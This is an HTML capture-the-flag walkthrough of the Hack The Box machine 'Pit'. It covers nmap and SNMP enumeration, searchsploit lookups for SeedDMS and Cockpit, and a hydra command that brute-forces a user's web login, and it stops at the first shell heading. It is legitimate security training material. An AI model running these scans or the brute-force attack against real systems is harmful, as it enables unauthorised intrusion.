---
layout: default
---
<html>
<head>
    <title>Pit Walkthrough</title>
    <a href="https://pusher91.github.io/Hacking/">Return to Main Page</a>
</head>

<body>
    
    <h1>Pit Walkthrough</h1>
    
    <hr>
    
    <h2>Contents</h2>
    <ul>
        <li><a href="#summary">Summary</a></li>
        <li><a href="#portscan">Port Scanning</a></li>
        <li><a href="#infogather">Information Gathering</a></li>
        <li><a href="#nginx">Shell - nginx</a></h2>
        <li><a href="#michelle">Shell - michelle</a></li>
        <li><a href="#root">Shell - root</a></li>
    </ul>
    
    <h2><a id="summary">Summary</a></h2>
    
    <p>This box starts out by using snmp output to fnd a web service hidden on a subdomain that is leaked by the SSL certificate.  On this web service, seeddms, I find an exploit to gain code execution.  Once on the box I find credentials for the sql server stored in a configuration file.  These credentials are reused for michelle on the other web service, cockpit.  On cockpit I am able to add an SSH key for michelle and then gain a shell as michelle.  As michelle I am able to create a script that exploits the /usr/bin/monitor executable that is being ran as root via snmp and I gain a root shell.</p>
    
    <h2><a id="portscan">Port Scanning</a></h2>
    
    <li>Running a port scan against the full port range to determine which ones are open.</li>
    
    <pre># Nmap 7.91 scan initiated Fri Nov 19 10:26:33 2021 as: nmap -p- -oN ping_tcp 10.129.95.189&#13;&#10;Nmap scan report for dms-pit.htb (10.129.95.189)&#13;&#10;Host is up (0.040s latency).&#13;&#10;Not shown: 65532 filtered ports&#13;&#10;PORT     STATE SERVICE&#13;&#10;22/tcp   open  ssh&#13;&#10;80/tcp   open  http&#13;&#10;9090/tcp open  zeus-admin&#13;&#10;&#13;&#10;# Nmap done at Fri Nov 19 10:29:12 2021 -- 1 IP address (1 host up) scanned in 159.16 seconds</pre>
    
    <li>Running an nmap scan using the flags -sV and -sC to enumerate service versions and other information.</li>
    
    <pre># Nmap 7.91 scan initiated Fri Nov 19 10:31:12 2021 as: nmap -p22,80,9090 -sV -sC -oN script_tcp 10.129.95.189&#13;&#10;Nmap scan report for dms-pit.htb (10.129.95.189)&#13;&#10;Host is up (0.038s latency).&#13;&#10;&#13;&#10;PORT     STATE SERVICE         VERSION&#13;&#10;22/tcp   open  ssh             OpenSSH 8.0 (protocol 2.0)&#13;&#10;| ssh-hostkey: &#13;&#10;|   3072 6f:c3:40:8f:69:50:69:5a:57:d7:9c:4e:7b:1b:94:96 (RSA)&#13;&#10;|   256 c2:6f:f8:ab:a1:20:83:d1:60:ab:cf:63:2d:c8:65:b7 (ECDSA)&#13;&#10;|_  256 6b:65:6c:a6:92:e5:cc:76:17:5a:2f:9a:e7:50:c3:50 (ED25519)&#13;&#10;80/tcp   open  http            nginx 1.14.1&#13;&#10;|_http-server-header: nginx/1.14.1&#13;&#10;|_http-title: 403 Forbidden&#13;&#10;9090/tcp open  ssl/zeus-admin?&#13;&#10;| fingerprint-strings: &#13;&#10;|   GetRequest, HTTPOptions: &#13;&#10;|     HTTP/1.1 400 Bad request&#13;&#10;|     Content-Type: text/html; charset=utf8&#13;&#10;|     Transfer-Encoding: chunked&#13;&#10;|     X-DNS-Prefetch-Control: off&#13;&#10;|     Referrer-Policy: no-referrer&#13;&#10;|     X-Content-Type-Options: nosniff&#13;&#10;|     Cross-Origin-Resource-Policy: same-origin&#13;&#10;|     &#60;!DOCTYPE html&#62;&#13;&#10;|     &#60;html&#62;&#13;&#10;|     &#60;head&#62;&#13;&#10;|     &#60;title&#62;&#13;&#10;|     request&#13;&#10;|     &#60;/title&#62;&#13;&#10;|     &#60;meta http-equiv=&#34;Content-Type&#34; content=&#34;text/html; charset=utf-8&#34;&#62;&#13;&#10;|     &#60;meta name=&#34;viewport&#34; content=&#34;width=device-width, initial-scale=1.0&#34;&#62;&#13;&#10;|     &#60;style&#62;&#13;&#10;|     body {&#13;&#10;|     margin: 0;&#13;&#10;|     font-family: &#34;RedHatDisplay&#34;, &#34;Open Sans&#34;, Helvetica, Arial, sans-serif;&#13;&#10;|     font-size: 12px;&#13;&#10;|     line-height: 1.66666667;&#13;&#10;|     color: #333333;&#13;&#10;|     background-color: #f5f5f5;&#13;&#10;|     border: 0;&#13;&#10;|     vertical-align: middle;&#13;&#10;|     font-weight: 300;&#13;&#10;|_    margin: 0 0 10p&#13;&#10;| ssl-cert: Subject: commonName=dms-pit.htb/organizationName=4cd9329523184b0ea52ba0d20a1a6f92/countryName=US&#13;&#10;| Subject Alternative Name: DNS:dms-pit.htb, DNS:localhost, IP Address:127.0.0.1&#13;&#10;| Not valid before: 2020-04-16T23:29:12&#13;&#10;|_Not valid after:  2030-06-04T16:09:12&#13;&#10;|_ssl-date: TLS randomness does not represent time&#13;&#10;1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :&#13;&#10;SF-Port9090-TCP:V=7.91%T=SSL%I=7%D=11/19%Time=6197C380%P=x86_64-pc-linux-g&#13;&#10;SF:nu%r(GetRequest,E70,&#34;HTTP/1\.1\x20400\x20Bad\x20request\r\nContent-Type&#13;&#10;SF::\x20text/html;\x20charset=utf8\r\nTransfer-Encoding:\x20chunked\r\nX-D&#13;&#10;SF:NS-Prefetch-Control:\x20off\r\nReferrer-Policy:\x20no-referrer\r\nX-Con&#13;&#10;SF:tent-Type-Options:\x20nosniff\r\nCross-Origin-Resource-Policy:\x20same-&#13;&#10;SF:origin\r\n\r\n29\r\n&#60;!DOCTYPE\x20html&#62;\n&#60;html&#62;\n&#60;head&#62;\n\x20\x20\x20\x2&#13;&#10;SF:0&#60;title&#62;\r\nb\r\nBad\x20request\r\nd08\r\n&#60;/title&#62;\n\x20\x20\x20\x20&#60;me&#13;&#10;SF:ta\x20http-equiv=\&#34;Content-Type\&#34;\x20content=\&#34;text/html;\x20charset=ut&#13;&#10;SF:f-8\&#34;&#62;\n\x20\x20\x20\x20&#60;meta\x20name=\&#34;viewport\&#34;\x20content=\&#34;width=d&#13;&#10;SF:evice-width,\x20initial-scale=1\.0\&#34;&#62;\n\x20\x20\x20\x20&#60;style&#62;\n\tbody\&#13;&#10;SF:x20{\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20margin:\x200;\n\x&#13;&#10;SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20font-family:\x20\&#34;RedHatD&#13;&#10;SF:isplay\&#34;,\x20\&#34;Open\x20Sans\&#34;,\x20Helvetica,\x20Arial,\x20sans-serif;\n&#13;&#10;SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20font-size:\x2012px;\n\x&#13;&#10;SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20line-height:\x201\.666666&#13;&#10;SF:67;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20color:\x20#333333;&#13;&#10;SF:\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20background-color:\x20&#13;&#10;SF:#f5f5f5;\n\x20\x20\x20\x20\x20\x20\x20\x20}\n\x20\x20\x20\x20\x20\x20\x&#13;&#10;SF:20\x20img\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20border:&#13;&#10;SF:\x200;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20vertical-align:&#13;&#10;SF:\x20middle;\n\x20\x20\x20\x20\x20\x20\x20\x20}\n\x20\x20\x20\x20\x20\x2&#13;&#10;SF:0\x20\x20h1\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20font-&#13;&#10;SF:weight:\x20300;\n\x20\x20\x20\x20\x20\x20\x20\x20}\n\x20\x20\x20\x20\x2&#13;&#10;SF:0\x20\x20\x20p\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20ma&#13;&#10;SF:rgin:\x200\x200\x2010p&#34;)%r(HTTPOptions,E70,&#34;HTTP/1\.1\x20400\x20Bad\x20&#13;&#10;SF:request\r\nContent-Type:\x20text/html;\x20charset=utf8\r\nTransfer-Enco&#13;&#10;SF:ding:\x20chunked\r\nX-DNS-Prefetch-Control:\x20off\r\nReferrer-Policy:\&#13;&#10;SF:x20no-referrer\r\nX-Content-Type-Options:\x20nosniff\r\nCross-Origin-Re&#13;&#10;SF:source-Policy:\x20same-origin\r\n\r\n29\r\n&#60;!DOCTYPE\x20html&#62;\n&#60;html&#62;\n&#13;&#10;SF:&#60;head&#62;\n\x20\x20\x20\x20&#60;title&#62;\r\nb\r\nBad\x20request\r\nd08\r\n&#60;/titl&#13;&#10;SF:e&#62;\n\x20\x20\x20\x20&#60;meta\x20http-equiv=\&#34;Content-Type\&#34;\x20content=\&#34;t&#13;&#10;SF:ext/html;\x20charset=utf-8\&#34;&#62;\n\x20\x20\x20\x20&#60;meta\x20name=\&#34;viewport&#13;&#10;SF:\&#34;\x20content=\&#34;width=device-width,\x20initial-scale=1\.0\&#34;&#62;\n\x20\x20\&#13;&#10;SF:x20\x20&#60;style&#62;\n\tbody\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x&#13;&#10;SF:20\x20margin:\x200;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20fo&#13;&#10;SF:nt-family:\x20\&#34;RedHatDisplay\&#34;,\x20\&#34;Open\x20Sans\&#34;,\x20Helvetica,\x20&#13;&#10;SF:Arial,\x20sans-serif;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20&#13;&#10;SF:font-size:\x2012px;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20li&#13;&#10;SF:ne-height:\x201\.66666667;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2&#13;&#10;SF:0\x20color:\x20#333333;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x&#13;&#10;SF:20background-color:\x20#f5f5f5;\n\x20\x20\x20\x20\x20\x20\x20\x20}\n\x2&#13;&#10;SF:0\x20\x20\x20\x20\x20\x20\x20img\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20&#13;&#10;SF:\x20\x20\x20\x20border:\x200;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20&#13;&#10;SF:\x20\x20vertical-align:\x20middle;\n\x20\x20\x20\x20\x20\x20\x20\x20}\n&#13;&#10;SF:\x20\x20\x20\x20\x20\x20\x20\x20h1\x20{\n\x20\x20\x20\x20\x20\x20\x20\x&#13;&#10;SF:20\x20\x20\x20\x20font-weight:\x20300;\n\x20\x20\x20\x20\x20\x20\x20\x2&#13;&#10;SF:0}\n\x20\x20\x20\x20\x20\x20\x20\x20p\x20{\n\x20\x20\x20\x20\x20\x20\x2&#13;&#10;SF:0\x20\x20\x20\x20\x20margin:\x200\x200\x2010p&#34;);&#13;&#10;&#13;&#10;Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .&#13;&#10;# Nmap done at Fri Nov 19 10:34:21 2021 -- 1 IP address (1 host up) scanned in 188.87 seconds
    </pre>
    
    <li>This box also required scanning UDP.  Here are the results of that scan below.</li>
    
    <pre># Nmap 7.91 scan initiated Fri Nov 19 11:57:43 2021 as: nmap -sU -sV -oN ping_udp 10.129.95.189&#13;&#10;Nmap scan report for dms-pit.htb (10.129.95.189)&#13;&#10;Host is up (0.038s latency).&#13;&#10;Not shown: 900 filtered ports, 99 open|filtered ports&#13;&#10;PORT    STATE SERVICE VERSION&#13;&#10;161/udp open  snmp    SNMPv1 server; net-snmp SNMPv3 server (public)&#13;&#10;Service Info: Host: pit.htb&#13;&#10;&#13;&#10;Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .&#13;&#10;# Nmap done at Fri Nov 19 12:14:27 2021 -- 1 IP address (1 host up) scanned in 1004.59 seconds</pre>
    
    <br>
    <h2><a id="infogather">Information Gathering</a></h2>
    
    <li>I First use snmpwalk against UDP port 161.  I use the command: <code>snmpwalk -v 1 -c public 10.129.95.189 . | tee snapwalk.out</code></li>
    
    <pre>iso.3.6.1.2.1.25.4.2.1.7.2967 = INTEGER: 2&#13;&#10;iso.3.6.1.2.1.25.4.2.1.7.2968 = INTEGER: 2&#13;&#10;iso.3.6.1.2.1.25.4.2.1.7.2969 = INTEGER: 2&#13;&#10;iso.3.6.1.2.1.25.4.2.1.7.2970 = INTEGER: 2&#13;&#10;iso.3.6.1.2.1.25.4.2.1.7.2976 = INTEGER: 4&#13;&#10;iso.3.6.1.4.1.2021.2.1.1.1 = INTEGER: 1&#13;&#10;iso.3.6.1.4.1.2021.2.1.2.1 = STRING: &quot;nginx&quot;&#13;&#10;iso.3.6.1.4.1.2021.2.1.3.1 = INTEGER: 1&#13;&#10;iso.3.6.1.4.1.2021.2.1.4.1 = INTEGER: 0&#13;&#10;iso.3.6.1.4.1.2021.2.1.5.1 = INTEGER: 3&#13;&#10;iso.3.6.1.4.1.2021.2.1.100.1 = INTEGER: 0&#13;&#10;iso.3.6.1.4.1.2021.2.1.102.1 = INTEGER: 0&#13;&#10;iso.3.6.1.4.1.2021.2.1.103.1 = &quot;&quot;&#13;&#10;iso.3.6.1.4.1.2021.9.1.1.1 = INTEGER: 1&#13;&#10;iso.3.6.1.4.1.2021.9.1.1.2 = INTEGER: 2&#13;&#10;iso.3.6.1.4.1.2021.9.1.2.1 = STRING: &quot;/&quot;&#13;&#10;<mark>iso.3.6.1.4.1.2021.9.1.2.2 = STRING: "/var/www/html/seeddms51x/seeddms"</mark>&#13;&#10;iso.3.6.1.4.1.2021.9.1.3.1 = STRING: &quot;/dev/mapper/cl-root&quot;&#13;&#10;iso.3.6.1.4.1.2021.9.1.3.2 = STRING: &quot;/dev/mapper/cl-seeddms&quot;&#13;&#10;iso.3.6.1.4.1.2021.9.1.4.1 = INTEGER: 10000&#13;&#10;iso.3.6.1.4.1.2021.9.1.4.2 = INTEGER: 100000&#13;&#10;iso.3.6.1.4.1.2021.9.1.5.1 = INTEGER: -1&#13;&#10;iso.3.6.1.4.1.2021.9.1.5.2 = INTEGER: -1&#13;&#10;iso.3.6.1.4.1.2021.9.1.6.1 = INTEGER: 2611200&#13;&#10;iso.3.6.1.4.1.2021.9.1.6.2 = INTEGER: 125600&#13;&#10;iso.3.6.1.4.1.2021.9.1.7.1 = INTEGER: 376056&#13;&#10;iso.3.6.1.4.1.2021.9.1.7.2 = INTEGER: 75496&#13;&#10;iso.3.6.1.4.1.2021.9.1.8.1 = INTEGER: 2235144&#13;&#10;iso.3.6.1.4.1.2021.9.1.8.2 = INTEGER: 50104&#13;&#10;iso.3.6.1.4.1.2021.9.1.9.1 = INTEGER: 86&#13;&#10;iso.3.6.1.4.1.2021.9.1.9.2 = INTEGER: 40&#13;&#10;iso.3.6.1.4.1.2021.9.1.10.1 = INTEGER: 6&#13;&#10;iso.3.6.1.4.1.2021.9.1.10.2 = INTEGER: 4&#13;&#10;iso.3.6.1.4.1.2021.9.1.11.1 = Gauge32: 2611200&#13;&#10;iso.3.6.1.4.1.2021.9.1.11.2 = Gauge32: 125600&#13;&#10;iso.3.6.1.4.1.2021.9.1.12.1 = Gauge32: 0&#13;&#10;iso.3.6.1.4.1.2021.9.1.12.2 = Gauge32: 0&#13;&#10;iso.3.6.1.4.1.2021.9.1.13.1 = Gauge32: 376056&#13;&#10;iso.3.6.1.4.1.2021.9.1.13.2 = Gauge32: 75496&#13;&#10;iso.3.6.1.4.1.2021.9.1.14.1 = Gauge32: 0&#13;&#10;iso.3.6.1.4.1.2021.9.1.14.2 = Gauge32: 0&#13;&#10;iso.3.6.1.4.1.2021.9.1.15.1 = Gauge32: 2235144&#13;&#10;iso.3.6.1.4.1.2021.9.1.15.2 = Gauge32: 50104&#13;&#10;iso.3.6.1.4.1.2021.9.1.16.1 = Gauge32: 0&#13;&#10;iso.3.6.1.4.1.2021.9.1.16.2 = Gauge32: 0&#13;&#10;iso.3.6.1.4.1.2021.9.1.100.1 = INTEGER: 0&#13;&#10;iso.3.6.1.4.1.2021.9.1.100.2 = INTEGER: 1&#13;&#10;iso.3.6.1.4.1.8072.1.3.2.1.0 = INTEGER: 1&#13;&#10;<mark>iso.3.6.1.4.1.8072.1.3.2.2.1.2.10.109.111.110.105.116.111.114.105.110.103 = STRING: &quot;/usr/bin/monitor&quot;</mark>&#13;&#10;iso.3.6.1.4.1.8072.1.3.2.2.1.3.10.109.111.110.105.116.111.114.105.110.103 = &quot;&quot;&#13;&#10;iso.3.6.1.4.1.8072.1.3.2.2.1.4.10.109.111.110.105.116.111.114.105.110.103 = &quot;&quot;&#13;&#10;iso.3.6.1.4.1.8072.1.3.2.2.1.5.10.109.111.110.105.116.111.114.105.110.103 = INTEGER: 5&#13;&#10;iso.3.6.1.4.1.8072.1.3.2.2.1.6.10.109.111.110.105.116.111.114.105.110.103 = INTEGER: 1&#13;&#10;iso.3.6.1.4.1.8072.1.3.2.2.1.7.10.109.111.110.105.116.111.114.105.110.103 = INTEGER: 1&#13;&#10;iso.3.6.1.4.1.8072.1.3.2.2.1.20.10.109.111.110.105.116.111.114.105.110.103 = INTEGER: 4&#13;&#10;iso.3.6.1.4.1.8072.1.3.2.2.1.21.10.109.111.110.105.116.111.114.105.110.103 = INTEGER: 1&#13;&#10;iso.3.6.1.4.1.8072.1.3.2.3.1.1.10.109.111.110.105.116.111.114.105.110.103 = STRING: &quot;Memory usage&quot;&#13;&#10;iso.3.6.1.4.1.8072.1.3.2.3.1.2.10.109.111.110.105.116.111.114.105.110.103 = STRING: &quot;Memory usage&#13;&#10;              total        used        free      shared  buff/cache   available&#13;&#10;Mem:          3.8Gi       315Mi       3.3Gi       8.0Mi       260Mi       3.3Gi&#13;&#10;Swap:         1.9Gi          0B       1.9Gi&#13;&#10;Database status&#13;&#10;OK - Connection to database successful.&#13;&#10;System release info&#13;&#10;CentOS Linux release 8.3.2011&#13;&#10;SELinux Settings&#13;&#10;user&#13;&#10;&#13;&#10;                Labeling   MLS/       MLS/                          &#13;&#10;SELinux User    Prefix     MCS Level  MCS Range                      SELinux Roles&#13;&#10;&#13;&#10;guest_u         user       s0         s0                             guest_r&#13;&#10;root            user       s0         s0-s0:c0.c1023                 staff_r sysadm_r system_r unconfined_r&#13;&#10;staff_u         user       s0         s0-s0:c0.c1023                 staff_r sysadm_r unconfined_r&#13;&#10;sysadm_u        user       s0         s0-s0:c0.c1023                 sysadm_r&#13;&#10;system_u        user       s0         s0-s0:c0.c1023                 system_r unconfined_r&#13;&#10;unconfined_u    user       s0         s0-s0:c0.c1023                 system_r unconfined_r&#13;&#10;user_u          user       s0         s0                             user_r&#13;&#10;xguest_u        user       s0         s0                             xguest_r&#13;&#10;login&#13;&#10;&#13;&#10;Login Name           SELinux User         MLS/MCS Range        Service&#13;&#10;&#13;&#10;__default__          unconfined_u         s0-s0:c0.c1023       *&#13;&#10;michelle             user_u               s0                   *&#13;&#10;root                 unconfined_u         s0-s0:c0.c1023       *&#13;&#10;System uptime&#13;&#10; 11:23:59 up  1:40,  0 users,  load average: 0.08, 0.02, 0.01&quot;&#13;&#10;iso.3.6.1.4.1.8072.1.3.2.3.1.3.10.109.111.110.105.116.111.114.105.110.103 = INTEGER: 31&#13;&#10;iso.3.6.1.4.1.8072.1.3.2.3.1.4.10.109.111.110.105.116.111.114.105.110.103 = INTEGER: 0&#13;&#10;iso.3.6.1.4.1.8072.1.3.2.4.1.2.10.109.111.110.105.116.111.114.105.110.103.1 = STRING: &quot;Memory usage&quot;&#13;&#10;iso.3.6.1.4.1.8072.1.3.2.4.1.2.10.109.111.110.105.116.111.114.105.110.103.2 = STRING: &quot;              total        used        free      shared  buff/cache   available&quot;&#13;&#10;iso.3.6.1.4.1.8072.1.3.2.4.1.2.10.109.111.110.105.116.111.114.105.110.103.3 = STRING: &quot;Mem:          3.8Gi       315Mi       3.3Gi       8.0Mi       260Mi       3.3Gi&quot;&#13;&#10;iso.3.6.1.4.1.8072.1.3.2.4.1.2.10.109.111.110.105.116.111.114.105.110.103.4 = STRING: &quot;Swap:         1.9Gi          0B       1.9Gi&quot;&#13;&#10;iso.3.6.1.4.1.8072.1.3.2.4.1.2.10.109.111.110.105.116.111.114.105.110.103.5 = STRING: &quot;Database status&quot;&#13;&#10;iso.3.6.1.4.1.8072.1.3.2.4.1.2.10.109.111.110.105.116.111.114.105.110.103.6 = STRING: &quot;OK - Connection to database successful.&quot;&#13;&#10;iso.3.6.1.4.1.8072.1.3.2.4.1.2.10.109.111.110.105.116.111.114.105.110.103.7 = STRING: &quot;System release info&quot;&#13;&#10;iso.3.6.1.4.1.8072.1.3.2.4.1.2.10.109.111.110.105.116.111.114.105.110.103.8 = STRING: &quot;CentOS Linux release 8.3.2011&quot;&#13;&#10;iso.3.6.1.4.1.8072.1.3.2.4.1.2.10.109.111.110.105.116.111.114.105.110.103.9 = STRING: &quot;SELinux Settings&quot;&#13;&#10;iso.3.6.1.4.1.8072.1.3.2.4.1.2.10.109.111.110.105.116.111.114.105.110.103.10 = STRING: &quot;user&quot;&#13;&#10;iso.3.6.1.4.1.8072.1.3.2.4.1.2.10.109.111.110.105.116.111.114.105.110.103.11 = &quot;&quot;&#13;&#10;iso.3.6.1.4.1.8072.1.3.2.4.1.2.10.109.111.110.105.116.111.114.105.110.103.12 = STRING: &quot;                Labeling   MLS/       MLS/                          &quot;&#13;&#10;iso.3.6.1.4.1.8072.1.3.2.4.1.2.10.109.111.110.105.116.111.114.105.110.103.13 = STRING: &quot;SELinux User    Prefix     MCS Level  MCS Range                      SELinux Roles&quot;&#13;&#10;iso.3.6.1.4.1.8072.1.3.2.4.1.2.10.109.111.110.105.116.111.114.105.110.103.14 = &quot;&quot;&#13;&#10;iso.3.6.1.4.1.8072.1.3.2.4.1.2.10.109.111.110.105.116.111.114.105.110.103.15 = STRING: &quot;guest_u         user       s0         s0                             guest_r&quot;&#13;&#10;iso.3.6.1.4.1.8072.1.3.2.4.1.2.10.109.111.110.105.116.111.114.105.110.103.16 = STRING: &quot;root            user       s0         s0-s0:c0.c1023                 staff_r sysadm_r system_r unconfined_r&quot;&#13;&#10;iso.3.6.1.4.1.8072.1.3.2.4.1.2.10.109.111.110.105.116.111.114.105.110.103.17 = STRING: &quot;staff_u         user       s0         s0-s0:c0.c1023                 staff_r sysadm_r unconfined_r&quot;&#13;&#10;iso.3.6.1.4.1.8072.1.3.2.4.1.2.10.109.111.110.105.116.111.114.105.110.103.18 = STRING: &quot;sysadm_u        user       s0         s0-s0:c0.c1023                 sysadm_r&quot;&#13;&#10;iso.3.6.1.4.1.8072.1.3.2.4.1.2.10.109.111.110.105.116.111.114.105.110.103.19 = STRING: &quot;system_u        user       s0         s0-s0:c0.c1023                 system_r unconfined_r&quot;&#13;&#10;iso.3.6.1.4.1.8072.1.3.2.4.1.2.10.109.111.110.105.116.111.114.105.110.103.20 = STRING: &quot;unconfined_u    user       s0         s0-s0:c0.c1023                 system_r unconfined_r&quot;&#13;&#10;iso.3.6.1.4.1.8072.1.3.2.4.1.2.10.109.111.110.105.116.111.114.105.110.103.21 = STRING: &quot;user_u          user       s0         s0                             user_r&quot;&#13;&#10;iso.3.6.1.4.1.8072.1.3.2.4.1.2.10.109.111.110.105.116.111.114.105.110.103.22 = STRING: &quot;xguest_u        user       s0         s0                             xguest_r&quot;&#13;&#10;iso.3.6.1.4.1.8072.1.3.2.4.1.2.10.109.111.110.105.116.111.114.105.110.103.23 = STRING: &quot;login&quot;&#13;&#10;iso.3.6.1.4.1.8072.1.3.2.4.1.2.10.109.111.110.105.116.111.114.105.110.103.24 = &quot;&quot;&#13;&#10;iso.3.6.1.4.1.8072.1.3.2.4.1.2.10.109.111.110.105.116.111.114.105.110.103.25 = STRING: &quot;Login Name           SELinux User         MLS/MCS Range        Service&quot;&#13;&#10;iso.3.6.1.4.1.8072.1.3.2.4.1.2.10.109.111.110.105.116.111.114.105.110.103.26 = &quot;&quot;&#13;&#10;iso.3.6.1.4.1.8072.1.3.2.4.1.2.10.109.111.110.105.116.111.114.105.110.103.27 = STRING: &quot;__default__          unconfined_u         s0-s0:c0.c1023       *&quot;&#13;&#10;iso.3.6.1.4.1.8072.1.3.2.4.1.2.10.109.111.110.105.116.111.114.105.110.103.28 = STRING: &quot;<mark>michelle</mark>             user_u               s0                   *&quot;&#13;&#10;iso.3.6.1.4.1.8072.1.3.2.4.1.2.10.109.111.110.105.116.111.114.105.110.103.29 = STRING: &quot;root                 unconfined_u         s0-s0:c0.c1023       *&quot;&#13;&#10;iso.3.6.1.4.1.8072.1.3.2.4.1.2.10.109.111.110.105.116.111.114.105.110.103.30 = STRING: &quot;System uptime&quot;&#13;&#10;iso.3.6.1.4.1.8072.1.3.2.4.1.2.10.109.111.110.105.116.111.114.105.110.103.31 = STRING: &quot; 11:23:59 up  1:40,  0 users,  load average: 0.08, 0.02, 0.01&quot;&#13;&#10;</pre>
    
    <li>There is a lot of output from snmwalk but towards the end I find three pieces of interesting information.</li>
    <ul>
        <li>The directory /var/www/html/seeddms51x/seedms exists.  Based on that we will look for a website running in that directory.</li>
        <li>/usr/bin/monitor and the information below it.  We will take note of this to check this file when we gain access to the box.</li>
        <li>The users root and michelle exist.</li>
    </ul>
    
    <br>
    
    <li>After checking out SNMP, we move to the web servers running on port 80 and 9090.  Before loading the pages, I also take note that the nmap output revelead the ssl certificate contains the domain dms-pit.htb.  I add this to my /etc/hosts file.</li>  
    <ul>
        <li>I check http://10.129.95.189 and it is just a default nginx splash page.  I also run gobuster against it as well as check for http://10.129.95.189/seeddms51x/seeddms but do not find anything.</li>
        <li>Next I check http://dms-pit.htb and I get a "403 Forbidden" page.  Checking http://dms-pit.htb/seeddms51x/seeddms I find that SeedDMS is running.</li>
        <li>Moving to port 9090 I check https://10.129.95.189:9090 and find a service running for CentOS Linux.  Reading the source code on this page reveals text like "This web browser is too old to run Cockpit" which leads me to believe the service is named Cockpit.</li>
        <li>https://dms-pit.htb:9090/ reveals the same web page as https://10.129.95.189:9090</li>
    </ul>

    <li>At this point I use searchsploit see what exploits exist for both seeddms and cockpit.</li>

    <pre>&boxdr;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/Documents/htb2/Pit]&#13;&#10;&boxur;&HorizontalLine;$ searchsploit seeddms &#13;&#10;----------------------------------------------------------------------------------- ---------------------------------&#13;&#10; Exploit Title                                                                     |  Path&#13;&#10;----------------------------------------------------------------------------------- ---------------------------------&#13;&#10;Seeddms 5.1.10 - Remote Command Execution (RCE) (Authenticated)                    | php/webapps/50062.py&#13;&#10;SeedDMS 5.1.18 - Persistent Cross-Site Scripting                                   | php/webapps/48324.txt&#13;&#10;SeedDMS &lt; 5.1.11 - &apos;out.GroupMgr.php&apos; Cross-Site Scripting                         | php/webapps/47024.txt&#13;&#10;SeedDMS &lt; 5.1.11 - &apos;out.UsrMgr.php&apos; Cross-Site Scripting                           | php/webapps/47023.txt&#13;&#10;SeedDMS versions &lt; 5.1.11 - Remote Command Execution                               | php/webapps/47022.txt&#13;&#10;----------------------------------------------------------------------------------- ---------------------------------&#13;&#10;Shellcodes: No Results&#13;&#10;                                                                                                                     &#13;&#10;&boxdr;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/Documents/htb2/Pit]&#13;&#10;&boxur;&HorizontalLine;$ searchsploit cockpit&#13;&#10;----------------------------------------------------------------------------------- ---------------------------------&#13;&#10; Exploit Title                                                                     |  Path&#13;&#10;----------------------------------------------------------------------------------- ---------------------------------&#13;&#10;Cockpit CMS 0.11.1 - &apos;Username Enumeration &amp; Password Reset&apos; NoSQL Injection       | multiple/webapps/50185.py&#13;&#10;Cockpit CMS 0.4.4 &lt; 0.5.5 - Server-Side Request Forgery                            | php/webapps/44567.txt&#13;&#10;Cockpit CMS 0.6.1 - Remote Code Execution                                          | php/webapps/49390.txt&#13;&#10;Cockpit Version 234 - Server-Side Request Forgery (Unauthenticated)                | multiple/webapps/49397.txt&#13;&#10;openITCOCKPIT 3.6.1-2 - Cross-Site Request Forgery                                 | php/webapps/47305.py&#13;&#10;----------------------------------------------------------------------------------- ---------------------------------&#13;&#10;Shellcodes: No Results</pre>

    <li>I find there are authenticated remote code execution exploits for both services.  I setup hydra to brute force passwords against seeddms using michelle as the user.</li>

    <pre>&boxdr;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/Documents/htb2/Pit]&#13;&#10;&boxur;&HorizontalLine;$ hydra dms-pit.htb http-post-form -l michelle -P /usr/share/wordlists/rockyou.txt &quot;/seeddms51x/seeddms/op/op.Login.php:login=^USER^&amp;pwd=^PASS^&amp;lang=:incorrect&quot;         &#13;&#10;Hydra v9.1 (c) 2020 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).&#13;&#10;&#13;&#10;Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-11-19 11:59:42&#13;&#10;[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task&#13;&#10;[DATA] attacking http-post-form://dms-pit.htb:80/seeddms51x/seeddms/op/op.Login.php:login=^USER^&amp;pwd=^PASS^&amp;lang=:incorrect&#13;&#10;[80][http-post-form] host: dms-pit.htb   login: michelle   password: michelle&#13;&#10;1 of 1 target successfully completed, 1 valid password found&#13;&#10;Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-11-19 11:59:46&#13;&#10;</pre>

    <br>
    <h2><a id="nginx">Shell - nginx</a></h2>

